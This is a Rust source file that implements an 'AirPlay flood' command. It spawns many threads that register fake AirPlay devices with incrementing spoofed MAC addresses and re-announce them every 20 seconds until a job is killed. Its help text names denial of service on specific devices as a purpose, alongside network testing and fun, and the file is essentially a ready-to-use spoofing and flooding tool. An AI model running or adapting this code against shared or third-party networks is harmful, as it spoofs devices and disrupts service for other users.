use std::sync::{mpsc, Arc, Mutex};
use std::thread;
use std::time::Duration;

use local_ip_address::local_ip;

use super::register_airplay_device;
use crate::{core::Job, utils, Command, CommandResult};

pub fn airplay_device_flood(
    name: &str,
    amount: usize,
    kill_channel: mpsc::Receiver<()>,
) -> Result<CommandResult, CommandResult> {
    let mut threads = Vec::with_capacity(amount);
    let mut mac = utils::MacAddr::new_zeroed();
    let name = name.to_string();
    let local_ip = local_ip().map_err(|e| CommandResult::Failure {
        message: format!("local machine ip address could not be determined: {}", e),
    })?;

    let kill_bool = false;
    let kb_arc = Arc::new(Mutex::new(kill_bool));

    //println!("{}", local_ip);
    //println!("{}", mac.as_string());
    for i in 0..amount {
        mac.increment();
        let mac_c = mac.clone();
        let name_c = name.clone();
        let kb_arc_clone = Arc::clone(&kb_arc);

        let t = thread::spawn(move || loop {
            let _ = register_airplay_device(
                &format!("{}{}", name_c, i),
                &mac_c,
                &format!("{}", local_ip,),
                8000,
            );

            {
                let lock = kb_arc_clone.lock().unwrap();
                if *lock == true {
                    drop(lock);
                    break;
                }
            }

            thread::sleep(Duration::from_secs(20));
        });
        threads.push(t);
    }

    loop {
        thread::sleep(Duration::from_secs(5));
        if kill_channel.try_recv().is_ok() {
            //println!("airplay flood top thread got signal...");
            {
                let mut lock = kb_arc.lock().unwrap();
                *lock = true;
            }
            break;
        }
    }

    for t in threads {
        if let Err(_) = t.join() {
            eprintln!("An AirPlay thread failed to join...");
        } else {
            //println!("thread joined");
        }
    }

    Ok(CommandResult::Success {
        message: "job killed".to_owned(),
    })
}

pub struct AirplayFlood;
impl Command for AirplayFlood {
    fn name(&self) -> &str {
        "flood"
    }

    fn info(&self) -> &str {
        "Used to create a large amount of fake AirPlay devices for several \
        different purposes, namely a DoS on specific devices, network testing, \
        and fun.\n\
        Flags:\n\
        -a or --amount <int> : amount of devices being created (default: 10)\n\
        -n or --name <string> : name of devices (default: airplay)"
    }

    fn run(&self, input: &str) -> Result<CommandResult, CommandResult> {
        let mut args = input.split_whitespace();
        let mut amount: usize = 10;
        let mut name: String = String::from("airplay");

        // Should write something that does this whole process by itself that
        // can be queried for flags, kinda like nushell
        while let Some(curr) = args.next() {
            match curr {
                "-a" | "--amount" => {
                    if let Some(a) = args.next() {
                        amount = a.parse().map_err(|e| CommandResult::Failure {
                            message: format!("amount unable to be parsed: {}", e),
                        })?;
                    } else {
                        return Err(CommandResult::Failure {
                            message: "amount flag used but no amount specified".to_owned(),
                        });
                    }
                }

                "-n" | "--name" => {
                    if let Some(n) = args.next() {
                        name = n.to_owned();
                    } else {
                        return Err(CommandResult::Failure {
                            message: "name flag used but no name specified".to_owned(),
                        });
                    }
                }

                &_ => {
                    return Err(CommandResult::Failure {
                        message: "unrecognized flag used".to_owned(),
                    })
                }
            }
        }

        let (sender, receiver) = mpsc::channel();

        let _ = thread::spawn(move || {
            let _ = airplay_device_flood(&name, amount, receiver);
        });

        Ok(CommandResult::SuccessWithJob {
            message: "AirPlay flood job created!".to_owned(),
            job: Job {
                name: "airplay-flood".to_owned(),
                sender: sender,
            },
        })
    }
}
